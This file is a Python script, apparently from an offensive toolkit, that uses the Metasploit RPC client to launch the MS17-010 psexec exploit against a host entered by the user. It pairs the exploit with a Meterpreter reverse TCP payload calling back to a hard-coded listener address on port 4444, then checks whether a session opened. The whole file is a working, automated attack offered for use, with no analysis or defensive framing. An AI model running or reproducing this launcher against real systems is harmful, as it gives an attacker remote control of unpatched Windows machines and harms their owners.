from library.pymetasploit3.msfrpc import MsfRpcClient
from time import sleep
#This module will only works with a hta link, it is compatible with mshta.py by transferring the URL over to this program as cmd


def init(client,host,lhost='172.168.103.160'):
    cid = client.consoles.console().cid
    exploit = client.modules.use('exploit','windows/smb/ms17_010_psexec')
    exploit['RHOSTS'] = host
    pl = client.modules.use('payload','windows/x64/meterpreter/reverse_tcp')
    pl['LHOST'] = lhost
    pl['LPORT'] = '4444'
    output=(client.consoles.console(cid).run_module_with_output(exploit,payload=pl).split('['))    
    x=1
    while x < len(output):
        print("[{}".format(output[x]),end= '')
        x+=1
    sleep(3)
    print("[*] Searching for exploited sessions...")
    for id,c in client.sessions.list.items():
        if c.get('session_host') == host:
            print("[+] Exploit is successful, session is {}.".format(id))
            exit()
    print("[-] No session is created.")


if __name__ == '__main__':
    client = MsfRpcClient('123',port=55552)
    host= input("Enter the host address: ")
    init(client,host)
